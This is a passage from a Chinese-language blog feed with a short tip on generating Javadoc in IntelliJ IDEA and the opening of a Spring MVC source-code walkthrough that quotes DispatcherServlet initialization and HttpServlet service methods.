      <title><![CDATA[在Intellij Idea中生成Javadoc]]></title>
      <url>http://qsli.github.io/2016/10/05/javadoc/</url>
      <content type="html"><![CDATA[<p><code>Tools | Generate JavaDoc</code>, 写上输出路径即可。</p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol>
<li><p>locale</p>
<p>简体中文写<code>zh_CN</code></p>
</li>
<li><p>编码</p>
<p>在<code>Other Commandline arguments</code>中指定</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-encoding UTF-8 -charset UTF-8</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
<li><p><a href="http://www.cnblogs.com/cyberniuniu/p/5021910.html" rel="external nofollow noopener noreferrer" target="_blank">在 IntelliJ IDEA 中为自己设计的类库生成 JavaDoc</a></p>
</li>
<li><p><a href="https://www.jetbrains.com/help/idea/2016.2/generate-javadoc-dialog.html" rel="external nofollow noopener noreferrer" target="_blank">Generate JavaDoc Dialog</a></p>
</li>
<li><p><a href="https://www.jetbrains.com/help/idea/2016.2/generating-javadoc-reference-for-a-project.html" rel="external nofollow noopener noreferrer" target="_blank">Generating JavaDoc Reference for a Project</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> idea </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Javadoc </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Spring Mvc源码剖析(一)]]></title>
      <url>http://qsli.github.io/2016/10/02/spring-mvc/</url>
      <content type="html"><![CDATA[<h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><img src="/2016/10/02/spring-mvc/arch.jpg">
<p>SpringMVC的核心是 <code>DispatcherServlet</code></p>
<h2 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h2><p>我们通过在<code>web.xml</code>中配置如下的语句，引入SpringMVC</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>mvc-dispatcher<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:/spring/mvc/mvc-dispatcher-servlet.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>上述代码段指定了servlet的class是spring的<code>DispatcherServlet</code>，初始化配置文件是<code>mvc-dispatcher-servlet.xml</code>,以及servlet的加载顺序。</p>
<p>既然<code>DispatcherServlet</code>也是一个<code>Servlet</code>，那他肯定也遵从servlet的规范。<br>我们知道Servlet定义了如下的接口：<br><img src="/2016/10/02/spring-mvc/servlet-interface.jpg"></p>
<p>其中比较重要的是<code>init</code>和<code>service</code>接口<br><code>init</code>方法在servlet的一生中只初始化一次，<code>service</code>接口是Servlet对外提供服务的接口<br>Servlet的生命周期如下:<br><img src="/2016/10/02/spring-mvc/Servlet_LifeCycle.jpg"></p>
<p>我们来看下<code>DispatcherServlet</code>的继承结构：</p>
<img src="/2016/10/02/spring-mvc/hierachy.jpg">
<h3 id="init方法"><a href="#init方法" class="headerlink" title="init方法"></a>init方法</h3><p>直接去看<code>DispatcherServlet</code>的源码是没有发现<code>init</code>方法的， 它的<code>init</code>方法继承自<code>HttpServletBean</code>，源码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Map config parameters onto bean properties of this servlet, and</span></span><br><span class="line"><span class="comment"> * invoke subclass initialization.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ServletException if bean properties are invalid (or required</span></span><br><span class="line"><span class="comment"> * properties are missing), or if subclass initialization fails.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">		logger.debug(<span class="string">"Initializing servlet '"</span> + getServletName() + <span class="string">"'"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Set bean properties from init parameters.</span></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		PropertyValues pvs = <span class="keyword">new</span> ServletConfigPropertyValues(getServletConfig(), <span class="keyword">this</span>.requiredProperties);</span><br><span class="line">		BeanWrapper bw = PropertyAccessorFactory.forBeanPropertyAccess(<span class="keyword">this</span>);</span><br><span class="line">		ResourceLoader resourceLoader = <span class="keyword">new</span> ServletContextResourceLoader(getServletContext());</span><br><span class="line">		bw.registerCustomEditor(Resource<span class="class">.<span class="keyword">class</span>, <span class="title">new</span> <span class="title">ResourceEditor</span>(<span class="title">resourceLoader</span>, <span class="title">getEnvironment</span>()))</span>;</span><br><span class="line">		initBeanWrapper(bw);</span><br><span class="line">		bw.setPropertyValues(pvs, <span class="keyword">true</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span> (BeansException ex) &#123;</span><br><span class="line">		logger.error(<span class="string">"Failed to set bean properties on servlet '"</span> + getServletName() + <span class="string">"'"</span>, ex);</span><br><span class="line">		<span class="keyword">throw</span> ex;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Let subclasses do whatever initialization they like.</span></span><br><span class="line">	initServletBean();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">		logger.debug(<span class="string">"Servlet '"</span> + getServletName() + <span class="string">"' configured successfully"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在这个方法中，主要完成了bean属性的配置，并且给子类留下了相应的hook</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Let subclasses do whatever initialization they like.</span></span><br><span class="line">initServletBean();</span><br></pre></td></tr></table></figure>
<p>这个方法在FrameworkServlet中有具体的实现，现在看下FrameworkServlet中的实现。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Overridden method of &#123;<span class="doctag">@link</span> HttpServletBean&#125;, invoked after any bean properties</span></span><br><span class="line"><span class="comment">	 * have been set. Creates this servlet's WebApplicationContext.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">initServletBean</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">		getServletContext().log(<span class="string">"Initializing Spring FrameworkServlet '"</span> + getServletName() + <span class="string">"'"</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.logger.isInfoEnabled()) &#123;</span><br><span class="line">			<span class="keyword">this</span>.logger.info(<span class="string">"FrameworkServlet '"</span> + getServletName() + <span class="string">"': initialization started"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">long</span> startTime = System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">this</span>.webApplicationContext = initWebApplicationContext();</span><br><span class="line">			initFrameworkServlet();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (ServletException ex) &#123;</span><br><span class="line">			<span class="keyword">this</span>.logger.error(<span class="string">"Context initialization failed"</span>, ex);</span><br><span class="line">			<span class="keyword">throw</span> ex;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (RuntimeException ex) &#123;</span><br><span class="line">			<span class="keyword">this</span>.logger.error(<span class="string">"Context initialization failed"</span>, ex);</span><br><span class="line">			<span class="keyword">throw</span> ex;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.logger.isInfoEnabled()) &#123;</span><br><span class="line">			<span class="keyword">long</span> elapsedTime = System.currentTimeMillis() - startTime;</span><br><span class="line">			<span class="keyword">this</span>.logger.info(<span class="string">"FrameworkServlet '"</span> + getServletName() + <span class="string">"': initialization completed in "</span> +</span><br><span class="line">					elapsedTime + <span class="string">" ms"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p><code>webApplicationContext</code>在此进行初始化，并且给子类留下了一个hook<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.webApplicationContext = initWebApplicationContext();</span><br><span class="line">initFrameworkServlet();</span><br></pre></td></tr></table></figure></p>
<p><code>initFrameworkServlet</code>在本类中并没有实现，用于子类控制</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* This method will be invoked after any bean properties have been set and</span></span><br><span class="line"><span class="comment">* the WebApplicationContext has been loaded. The default implementation is empty;</span></span><br><span class="line"><span class="comment">* subclasses may override this method to perform any initialization they require.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@throws</span> ServletException in case of an initialization exception</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initFrameworkServlet</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在initWebApplicationContext方法中，有一个空实现的方法onRefresh()<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Template method which can be overridden to add servlet-specific refresh work.</span></span><br><span class="line"><span class="comment">* Called after successful context refresh.</span></span><br><span class="line"><span class="comment">* &lt;p&gt;This implementation is empty.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> context the current WebApplicationContext</span></span><br><span class="line"><span class="comment">* <span class="doctag">@see</span> #refresh()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onRefresh</span><span class="params">(ApplicationContext context)</span> </span>&#123;</span><br><span class="line"><span class="comment">// For subclasses: do nothing by default.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个方法也是钩子方法，DispatcherServlet正是实现了这个方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	* This implementation calls &#123;<span class="doctag">@link</span> #initStrategies&#125;.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onRefresh</span><span class="params">(ApplicationContext context)</span> </span>&#123;</span><br><span class="line">		initStrategies(context);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">		 * Initialize the strategy objects that this servlet uses.</span></span><br><span class="line"><span class="comment">		 * &lt;p&gt;May be overridden in subclasses in order to initialize further strategy objects.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initStrategies</span><span class="params">(ApplicationContext context)</span> </span>&#123;</span><br><span class="line">			initMultipartResolver(context);</span><br><span class="line">			initLocaleResolver(context);</span><br><span class="line">			initThemeResolver(context);</span><br><span class="line">			initHandlerMappings(context);</span><br><span class="line">			initHandlerAdapters(context);</span><br><span class="line">			initHandlerExceptionResolvers(context);</span><br><span class="line">			initRequestToViewNameTranslator(context);</span><br><span class="line">			initViewResolvers(context);</span><br><span class="line">			initFlashMapManager(context);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>onRefresh方法中又调用了initStrategies方法，在这个方法中进行了大量的初始化工作。</p>
<p>视图解析器和HandlerMappings都是在这个方法中初始化的。</p>
<p>重点看一下initHandlerMappings方法，这个方法是初始化url映射的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Initialize the HandlerMappings used by this class.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;If no HandlerMapping beans are defined in the BeanFactory for this namespace,</span></span><br><span class="line"><span class="comment">	 * we default to BeanNameUrlHandlerMapping.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initHandlerMappings</span><span class="params">(ApplicationContext context)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.handlerMappings = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.detectAllHandlerMappings) &#123;</span><br><span class="line">			<span class="comment">// Find all HandlerMappings in the ApplicationContext, including ancestor contexts.</span></span><br><span class="line">			Map&lt;String, HandlerMapping&gt; matchingBeans =</span><br><span class="line">					BeanFactoryUtils.beansOfTypeIncludingAncestors(context, HandlerMapping<span class="class">.<span class="keyword">class</span>, <span class="title">true</span>, <span class="title">false</span>)</span>;</span><br><span class="line">			<span class="keyword">if</span> (!matchingBeans.isEmpty()) &#123;</span><br><span class="line">				<span class="keyword">this</span>.handlerMappings = <span class="keyword">new</span> ArrayList&lt;HandlerMapping&gt;(matchingBeans.values());</span><br><span class="line">				<span class="comment">// We keep HandlerMappings in sorted order.</span></span><br><span class="line">				AnnotationAwareOrderComparator.sort(<span class="keyword">this</span>.handlerMappings);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				HandlerMapping hm = context.getBean(HANDLER_MAPPING_BEAN_NAME, HandlerMapping<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">				<span class="keyword">this</span>.handlerMappings = Collections.singletonList(hm);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span> (NoSuchBeanDefinitionException ex) &#123;</span><br><span class="line">				<span class="comment">// Ignore, we'll add a default HandlerMapping later.</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Ensure we have at least one HandlerMapping, by registering</span></span><br><span class="line">		<span class="comment">// a default HandlerMapping if no other mappings are found.</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.handlerMappings == <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">this</span>.handlerMappings = getDefaultStrategies(context, HandlerMapping<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">			<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">				logger.debug(<span class="string">"No HandlerMappings found in servlet '"</span> + getServletName() + <span class="string">"': using default"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>  其根据 this.detectAllHandlerMappings 的值来确定是否扫描祖先定义的handlermappings，如果用户没有配置的话，就会使用默认的HandlerMapping<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Detect all HandlerMappings or just expect "handlerMapping" bean? */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">boolean</span> detectAllHandlerMappings = <span class="keyword">true</span>;</span><br></pre></td></tr></table></figure></p>
<h3 id="service方法"><a href="#service方法" class="headerlink" title="service方法"></a>service方法</h3><p>servlet接口中另外一个重要的方法叫做<code>service</code></p>
<p><code>service</code>方法最早是在<code>HttpServlet</code>类中实现的，代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Dispatches client requests to the protected</span></span><br><span class="line"><span class="comment">     * &lt;code&gt;service&lt;/code&gt; method. There's no need to</span></span><br><span class="line"><span class="comment">     * override this method.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> req   the &#123;<span class="doctag">@link</span> HttpServletRequest&#125; object that</span></span><br><span class="line"><span class="comment">     *                  contains the request the client made of</span></span><br><span class="line"><span class="comment">     *                  the servlet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> res   the &#123;<span class="doctag">@link</span> HttpServletResponse&#125; object that</span></span><br><span class="line"><span class="comment">     *                  contains the response the servlet returns</span></span><br><span class="line"><span class="comment">     *                  to the client                                </span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@exception</span> IOException   if an input or output error occurs</span></span><br><span class="line"><span class="comment">     *                              while the servlet is handling the</span></span><br><span class="line"><span class="comment">     *                              HTTP request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@exception</span> ServletException  if the HTTP request cannot</span></span><br><span class="line"><span class="comment">     *                                  be handled</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> javax.servlet.Servlet#service</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest req, ServletResponse res)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        HttpServletRequest  request;</span><br><span class="line">        HttpServletResponse response;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(req <span class="keyword">instanceof</span> HttpServletRequest &amp;&amp;</span><br><span class="line">                res <span class="keyword">instanceof</span> HttpServletResponse)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ServletException(<span class="string">"non-HTTP request or response"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        request = (HttpServletRequest) req;</span><br><span class="line">        response = (HttpServletResponse) res;</span><br><span class="line"></span><br><span class="line">        service(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>它又调用自身的一个<code>service</code>方法:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Receives standard HTTP requests from the public</span></span><br><span class="line"><span class="comment">    * &lt;code&gt;service&lt;/code&gt; method and dispatches</span></span><br><span class="line"><span class="comment">    * them to the &lt;code&gt;do&lt;/code&gt;&lt;i&gt;XXX&lt;/i&gt; methods defined in</span></span><br><span class="line"><span class="comment">    * this class. This method is an HTTP-specific version of the</span></span><br><span class="line"><span class="comment">    * &#123;<span class="doctag">@link</span> javax.servlet.Servlet#service&#125; method. There's no</span></span><br><span class="line"><span class="comment">    * need to override this method.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> req   the &#123;<span class="doctag">@link</span> HttpServletRequest&#125; object that</span></span><br><span class="line"><span class="comment">    *                  contains the request the client made of</span></span><br><span class="line"><span class="comment">    *                  the servlet</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> resp  the &#123;<span class="doctag">@link</span> HttpServletResponse&#125; object that</span></span><br><span class="line"><span class="comment">    *                  contains the response the servlet returns</span></span><br><span class="line"><span class="comment">    *                  to the client                                </span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@exception</span> IOException   if an input or output error occurs</span></span><br><span class="line"><span class="comment">    *                              while the servlet is handling the</span></span><br><span class="line"><span class="comment">    *                              HTTP request</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@exception</span> ServletException  if the HTTP request</span></span><br><span class="line"><span class="comment">    *                                  cannot be handled</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@see</span> javax.servlet.Servlet#service</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span></span><br><span class="line"><span class="function">       <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       String method = req.getMethod();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (method.equals(METHOD_GET)) &#123;</span><br><span class="line">           <span class="keyword">long</span> lastModified = getLastModified(req);</span><br><span class="line">           <span class="keyword">if</span> (lastModified == -<span class="number">1</span>) &#123;</span><br><span class="line">               <span class="comment">// servlet doesn't support if-modified-since, no reason</span></span><br><span class="line">               <span class="comment">// to go through further expensive logic</span></span><br><span class="line">               doGet(req, resp);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">long</span> ifModifiedSince = req.getDateHeader(HEADER_IFMODSINCE);</span><br><span class="line">               <span class="keyword">if</span> (ifModifiedSince &lt; lastModified) &#123;</span><br><span class="line">                   <span class="comment">// If the servlet mod time is later, call doGet()</span></span><br><span class="line">                   <span class="comment">// Round down to the nearest second for a proper compare</span></span><br><span class="line">                   <span class="comment">// A ifModifiedSince of -1 will always be less</span></span><br><span class="line">                   maybeSetLastModified(resp, lastModified);</span><br><span class="line">                   doGet(req, resp);</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(METHOD_HEAD)) &#123;</span><br><span class="line">           <span class="keyword">long</span> lastModified = getLastModified(req);</span><br><span class="line">           maybeSetLastModified(resp, lastModified);</span><br><span class="line">           doHead(req, resp);</span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(METHOD_POST)) &#123;</span><br><span class="line">        